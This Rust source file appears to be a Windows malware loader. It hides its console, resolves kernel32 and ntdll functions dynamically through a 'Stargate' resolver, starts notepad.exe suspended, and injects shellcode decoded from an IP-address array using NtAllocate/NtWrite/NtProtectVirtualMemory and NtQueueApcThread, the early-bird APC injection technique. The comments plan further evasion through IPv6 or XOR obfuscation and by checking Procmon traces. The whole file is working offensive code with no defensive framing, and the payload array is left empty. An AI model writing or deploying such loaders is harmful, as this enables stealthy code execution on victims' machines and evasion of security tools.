#![windows_subsystem = "windows"]

//CHECK CMD TRACE
//CHECK API TRACE - PROCMON
//CHECK STARGATE SIZE(OPTIM)
//MSEDGE 

//OBFUSC USING IPV6?? OR SEPARATE FILE OR STRING REPLACEMENT OR XOR??


mod resolver;
mod decoder;

use windows::Win32::Foundation::HANDLE;
use windows::Win32::System::Threading::{STARTUPINFOW, PROCESS_INFORMATION};
use windows::core::PWSTR;
use std::mem::transmute;
use std::ptr::null_mut;
use std::ffi::c_void;

// Function Signatures for all resolved APIs
type CreateProcessWFn = unsafe extern "system" fn(
    *const u16, PWSTR, *mut c_void, *mut c_void, bool, u32, *mut c_void, *const u16, *const STARTUPINFOW, *mut PROCESS_INFORMATION
) -> bool;

type ResumeThreadFn = unsafe extern "system" fn(HANDLE) -> u32;
type NtAllocateVM = unsafe extern "system" fn(HANDLE, &mut *mut c_void, usize, &mut usize, u32, u32) -> i32;
type NtProtectVM = unsafe extern "system" fn(HANDLE, &mut *mut c_void, &mut usize, u32, &mut u32) -> i32;
type NtQueueApc = unsafe extern "system" fn(HANDLE, *const c_void, *const c_void, *const c_void, u32) -> i32;
type NtWriteVM = unsafe extern "system" fn(
    HANDLE, *mut c_void, *const c_void, usize, *mut usize
) -> i32;

fn main() -> Result<(), Box<dyn std::error::Error>> {
     

    // 1. Initialize Stargate for both DLLs
    let resolver = resolver::StargateResolver::new()?;

    unsafe {
        // 2. Resolve KERNEL32 functions
        let create_process: CreateProcessWFn = transmute(resolver.resolve_k32("CreateProcessW").expect("K32 CPW"));
        let resume_thread: ResumeThreadFn = transmute(resolver.resolve_k32("ResumeThread").expect("K32 RT"));

        // 3. Resolve NTDLL functions
        let nt_alloc: NtAllocateVM = transmute(resolver.resolve_nt("NtAllocateVirtualMemory").expect("NT Alloc"));
        let nt_protect: NtProtectVM = transmute(resolver.resolve_nt("NtProtectVirtualMemory").expect("NT Protect"));
        let nt_queue_apc: NtQueueApc = transmute(resolver.resolve_nt("NtQueueApcThread").expect("NT APC"));

        // 4. Execution Logic
        let mut si = STARTUPINFOW::default();
        let mut pi = PROCESS_INFORMATION::default();
        let mut cmd: Vec<u16> = "C:\\Windows\\System32\\notepad.exe\0".encode_utf16().collect();
     
        
        // Use 0x4 for CREATE_SUSPENDED
        create_process(null_mut(), PWSTR(cmd.as_mut_ptr()), null_mut(), null_mut(), false, 0x4, null_mut(), null_mut(), &si, &mut pi);
        
        let mut base_addr: *mut c_void = null_mut();
let mut shellcode_ips = []; //replace with IP array

        let mut size: usize = shellcode_ips.len() * 4;
        
        // Allocate RW (0x04)
        nt_alloc(pi.hProcess, &mut base_addr, 0, &mut size, 0x3000, 0x04);
	
        // Write shellcode using IPv4 decoder
        unsafe {
    // 1. Get bytes locally
    let payload = decoder::ip_to_bytes(&shellcode_ips);
    println!("[+] Local decode complete: {} bytes", payload.len());

    // 2. Resolve Write API
    let nt_write: NtWriteVM = transmute(resolver.resolve_nt("NtWriteVirtualMemory").expect("!Write"));

    // 3. Push to Remote Process
    let mut written = 0usize;
    nt_write(
        pi.hProcess, 
        base_addr, // The remote address from nt_alloc
        payload.as_ptr() as *const _, 
        payload.len(), 
        &mut written
    );

    println!("[+] Remote write complete: {} bytes.", written);
}

        // Protect RX (0x20)
        let mut old_prot = 0u32;
        nt_protect(pi.hProcess, &mut base_addr, &mut size, 0x20, &mut old_prot);

        // Queue and Resume
        nt_queue_apc(pi.hThread, base_addr, null_mut(), null_mut(), 0);
        resume_thread(pi.hThread);
        
    }
    Ok(())
}


